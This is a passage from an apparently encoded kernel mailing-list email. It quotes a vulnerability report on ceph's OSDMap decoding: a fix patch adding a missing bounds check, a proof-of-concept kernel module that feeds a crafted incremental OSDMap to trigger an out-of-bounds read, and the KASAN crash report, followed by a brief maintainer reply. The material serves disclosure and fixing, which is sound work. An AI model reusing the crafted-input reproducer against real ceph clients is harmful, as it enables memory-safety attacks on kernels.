+> 2026=EB=85=84 7=EC=9B=94 25=EC=9D=BC (=ED=86=A0) =EC=98=A4=ED=9B=84 2:44,=
+ Baul Lee <baul.lee@xbow.com>=EB=8B=98=EC=9D=B4 =EC=9E=91=EC=84=B1:
+> > fix.patch--- a/net/ceph/osdmap.c
+> > +++ b/net/ceph/osdmap.c
+> > @@ -1902,6 +1902,7 @@ static int decode_new_up_state_weight(void
+> > **p, void *end, u8 struct_v,
+> > =C2=A0		s32 osd;
+> > =C2=A0		u32 xorstate;
+> > =C2=A0
+> > +		ceph_decode_need(p, end, sizeof(u32) + (struct_v
+> > >=3D 5 ? sizeof(u32) : sizeof(u8)), e_inval);
+> > =C2=A0		osd =3D ceph_decode_32(p);
+> > =C2=A0		if (osd >=3D map->max_osd)
+> > =C2=A0			goto e_inval;
+> > poc.c// SPDX-License-Identifier: GPL-2.0
+> > #include <linux/module.h>
+> > #include <linux/kernel.h>
+> > #include <linux/slab.h>
+> > #include <linux/mm.h>
+> > #include <linux/ceph/osdmap.h>
+> > #include <linux/ceph/decode.h>
+> >=20
+> > static void put8(u8 **q, u8 v)   { **q =3D v; *q +=3D 1; }
+> > static void put32(u8 **q, u32 v) { __le32 le =3D cpu_to_le32(v);
+> > memcpy(*q, &le, 4); *q +=3D 4; }
+> > static void put64(u8 **q, u64 v) { __le64 le =3D cpu_to_le64(v);
+> > memcpy(*q, &le, 8); *q +=3D 8; }
+> >=20
+> > #define MAXOSD 8u
+> >=20
+> > static int __init poc_init(void)
+> > {
+> > 	struct ceph_osdmap *map, *ret;
+> > 	u8 *buf, *q;
+> > 	void *p, *end;
+> > 	size_t len;
+> > 	int i;
+> >=20
+> > 	map =3D ceph_osdmap_alloc();
+> > 	if (!map)
+> > 		return -ENOMEM;
+> >=20
+> > 	len =3D 12 + (16+4+8+8+4) + (4+4+4) + (4+4+4) + (4+4+4);
+> > 	buf =3D kvmalloc(len, GFP_KERNEL);
+> > 	if (!buf) {
+> > 		ceph_osdmap_destroy(map);
+> > 		return -ENOMEM;
+> > 	}
+> > 	q =3D buf;
+> >=20
+> > 	put8(&q, 7); put8(&q, 7); put32(&q, 0);
+> > 	put8(&q, 7); put8(&q, 1); put32(&q, 0);
+> >=20
+> > 	for (i =3D 0; i < 16; i++)
+> > 		put8(&q, 0);
+> > 	put32(&q, 1);
+> > 	put32(&q, 0); put32(&q, 0);
+> > 	put64(&q, (u64)-1);
+> > 	put32(&q, (u32)-1);
+> > 	put32(&q, 0);
+> > 	put32(&q, 0);
+> > 	put32(&q, MAXOSD);
+> > 	put32(&q, 0);
+> > 	put32(&q, 0);
+> > 	put32(&q, 0);
+> >=20
+> > 	put32(&q, 0);
+> > 	put32(&q, 0x20000000u);
+> > 	put32(&q, 0);
+> >=20
+> > 	BUG_ON((size_t)(q - buf) !=3D len);
+> >=20
+> > 	p =3D buf;
+> > 	end =3D buf + len;
+> > 	ret =3D osdmap_apply_incremental(&p, end, false, map);
+> > 	if (!IS_ERR(ret))
+> > 		map =3D ret;
+> > 	ceph_osdmap_destroy(map);
+> > 	kvfree(buf);
+> > 	return 0;
+> > }
+> >=20
+> > static void __exit poc_exit(void) { }
+> >=20
+> > module_init(poc_init);
+> > module_exit(poc_exit);
+> > MODULE_LICENSE("GPL");
+> > MODULE_DESCRIPTION("KASAN PoC: ceph decode_new_up_state_weight OOB
+> > read");
+> > KASANLinux 7.2.0-rc2 (origin/master 0e35b9b6ec0f), arm64,
+> > CONFIG_KASAN=3Dy CONFIG_CEPH_LIB=3Dm. QEMU virt.
+> > Reproducer: poc/poc.c (minimized) feeds a crafted incremental
+> > OSDMap to the unmodified
+> > osdmap_apply_incremental() -> decode_new_up_state_weight() path
+> > (the exact bytes a malicious
+> > ceph monitor's MSG_OSD_MAP would decode); the vulnerable function
+> > is byte-for-byte unmodified.
+> >=20
+> > =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+> > BUG: KASAN: slab-out-of-bounds in
+> > decode_new_up_state_weight+0x3f8/0x900 [libceph]
+> > Read of size 4 at addr ffff000019a51264 by task insmod/241
+> >=20
+> > CPU: 1 UID: 0 PID: 241 Comm: insmod Tainted: G    B      OE     =20
+> > 7.0.0 #5 PREEMPT(lazy)
+> > Tainted: [B]=3DBAD_PAGE, [O]=3DOOT_MODULE, [E]=3DUNSIGNED_MODULE
+> > Hardware name: linux,dummy-virt (DT)
+> > Call trace:
+> > =C2=A0show_stack+0x24/0x50 (C)
+> > =C2=A0dump_stack_lvl+0x80/0xc0
+> > =C2=A0print_report+0x164/0x4e8
+> > =C2=A0kasan_report+0xb0/0x128
+> > =C2=A0kasan_check_range+0x114/0x200
+> > =C2=A0__asan_loadN+0x20/0x48
+> > =C2=A0decode_new_up_state_weight+0x3f8/0x900 [libceph]
+> > =C2=A0osdmap_apply_incremental+0x3d4/0xa28 [libceph]
+> > =C2=A0poc_init+0x23c/0xf70 [ceph_osdmap_poc]
+> > =C2=A0do_one_initcall+0xb4/0x6a0
+> > =C2=A0do_init_module+0x1c4/0x4c8
+> > =C2=A0load_module+0x30b4/0x37e8
+> > =C2=A0init_module_from_file+0x190/0x1f8
+> > =C2=A0__arm64_sys_finit_module+0x304/0x4e0
+> > =C2=A0invoke_syscall.constprop.0+0xa8/0x188
+> > =C2=A0el0_svc_common.constprop.0+0x80/0x178
+> > =C2=A0do_el0_svc+0x3c/0x70
+> > =C2=A0el0_svc+0x44/0x140
+> > =C2=A0el0t_64_sync_handler+0xc0/0x110
+> > =C2=A0el0t_64_sync+0x1b8/0x1c0
+> >=20
+> > Allocated by task 241:
+> > =C2=A0kasan_save_stack+0x44/0x88
+> > =C2=A0kasan_save_track+0x24/0x58
+> > =C2=A0kasan_save_alloc_info+0x48/0x90
+> > =C2=A0__kasan_kmalloc+0xd8/0x110
+> > =C2=A0__kvmalloc_node_noprof+0x23c/0x7f0
+> > =C2=A0poc_init+0xb4/0xf70 [ceph_osdmap_poc]        <- the crafted 88-
+> > byte inc-osdmap buffer
+> >=20
+> > The buggy address belongs to the object at ffff000019a51200
+> > =C2=A0which belongs to the cache kmalloc-rnd-08-96 of size 96
+> > The buggy address is located 12 bytes to the right of
+> > =C2=A0allocated 88-byte region [ffff000019a51200, ffff000019a51258)
+
+Please, follow to this guidance [1]. This is not the formal patch.
+
+Thanks,
+Slava.
+
+[1] https://docs.kernel.org/process/submitting-patches.html
+
